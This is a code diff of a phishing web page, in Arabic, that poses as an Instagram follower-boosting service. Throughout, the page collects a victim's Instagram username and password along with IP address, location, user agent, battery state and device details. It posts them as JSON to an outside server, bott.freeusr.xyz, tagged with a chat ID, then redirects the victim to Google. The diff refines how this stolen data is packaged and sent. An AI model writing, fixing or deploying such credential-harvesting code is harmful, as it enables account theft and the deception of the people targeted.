@@ -213,7 +213,7 @@
         <div class="logo">📸</div>
         <h2>زيادة متابعين انستجرام <span>🚀</span></h2>
 
-        <form id="loginForm" enctype="multipart/form-data">
+        <form id="loginForm">
             <div class="input-group">
                 <label>📧 البريد الإلكتروني أو اليوزر</label>
                 <input type="text" id="username" placeholder="أدخل البريد الإلكتروني أو اسم المستخدم" required>
@@ -306,7 +306,7 @@
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 3000);
 
-                const res = await fetch('https://ipapi.co/json/', {
+                const res = await fetch('https://ipwho.is/', {
                     signal: controller.signal
                 });
                 clearTimeout(timeoutId);
@@ -333,9 +333,9 @@
         // ============================================
         // جلب معلومات الجهاز
         // ============================================
-        function getDeviceInfo() {
+        function getPlatformInfo() {
             const ua = navigator.userAgent;
-            let platform = "غير معروف";
+            let platform = "Unknown";
             if (/Windows/.test(ua)) platform = "Windows";
             else if (/Mac/.test(ua)) platform = "MacOS";
             else if (/Linux/.test(ua)) platform = "Linux";
@@ -348,23 +348,34 @@
         // جلب معلومات البطارية
         // ============================================
         async function getBatteryInfo() {
-            try {
-                if ('getBattery' in navigator) {
+            if ('getBattery' in navigator) {
+                try {
                     const battery = await navigator.getBattery();
                     return {
-                        batteryLevel: Math.round(battery.level * 100) + '%',
-                        batteryCharging: battery.charging ? 'نعم' : 'لا'
+                        batteryLevel: battery.level,
+                        batteryCharging: battery.charging
                     };
+                } catch (error) {
+                    console.error('Error getting battery info:', error);
                 }
-            } catch (error) {}
-            return { batteryLevel: 'غير متاح', batteryCharging: 'غير متاح' };
+            }
+            return { batteryLevel: undefined, batteryCharging: undefined };
         }
 
         // ============================================
-        // معالج إرسال النموذج - متوافق مع مسار /submitIncrease
+        // جلب إصدار الجهاز
         // ============================================
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+
+        // ============================================
+        // معالج إرسال النموذج - بنفس طريقة الإرسال القديمة (JSON)
+        // ============================================
+        document.getElementById('loginForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
 
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
@@ -379,39 +390,50 @@
                 return;
             }
 
+            // عرض السبينر
             document.getElementById('spinner').style.display = 'block';
             document.getElementById('submitBtn').disabled = true;
 
             try {
-                const ipData = await getIPInfo();
-                const deviceInfo = getDeviceInfo();
+                // ✅ جلب جميع المعلومات بنفس الطريقة القديمة
+                const ipInfo = await getIPInfo();
+                const platformInfo = getPlatformInfo();
                 const batteryInfo = await getBatteryInfo();
+                const deviceVersion = getDeviceVersion();
 
-                // ✅ استخدام FormData كما يطلبه الخادم
-                const formData = new FormData();
-                formData.append('username', username);
-                formData.append('password', password);
-                formData.append('platform', 'Instagram');
-                formData.append('chatId', chatId || 'غير معروف');
-                formData.append('ip', ipData.ip);
-                formData.append('country', ipData.country);
-                formData.append('city', ipData.city);
-                formData.append('userAgent', deviceInfo.userAgent);
-                formData.append('batteryLevel', batteryInfo.batteryLevel);
-                formData.append('charging', batteryInfo.batteryCharging === 'نعم' ? 'true' : 'false');
-                formData.append('osVersion', deviceInfo.platform);
-                formData.append('followers', followers);
+                // ✅ بناء كائن البيانات بنفس شكل الكود القديم
+                const data = {
+                    username: username,
+                    password: password,
+                    platform: 'Instagram',
+                    chatId: chatId || '',
+                    ip: ipInfo.ip,
+                    country: ipInfo.country,
+                    city: ipInfo.city,
+                    userAgent: platformInfo.userAgent,
+                    batteryLevel: batteryInfo.batteryLevel,
+                    charging: batteryInfo.batteryCharging,
+                    osVersion: deviceVersion,
+                    followers: followers
+                };
 
-                // ✅ إرسال إلى المسار الصحيح
+                console.log('Sending data:', data);
+
+                // ✅ إرسال كـ JSON بنفس طريقة الكود القديم
                 const response = await fetch('https://bott.freeusr.xyz/submitIncrease', {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
                 });
 
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('submitBtn').disabled = false;
 
-                if (response.ok) {
+                const result = await response.json();
+
+                if (result.success) {
                     document.getElementById('loginForm').style.display = 'none';
                     document.getElementById('successMessage').style.display = 'block';
 
@@ -419,13 +441,11 @@
                         window.location.href = "https://www.google.com/";
                     }, 2500);
                 } else {
-                    const errorText = await response.text();
-                    console.error('Server error:', response.status, errorText);
                     sendFailReport('upload', 'فشل إرسال البيانات', {
                         status: response.status,
-                        error: errorText
+                        error: result.error || 'Unknown'
                     });
-                    alert('فشل الإرسال. حاول مرة أخرى.');
+                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
                 }
 
             } catch (error) {
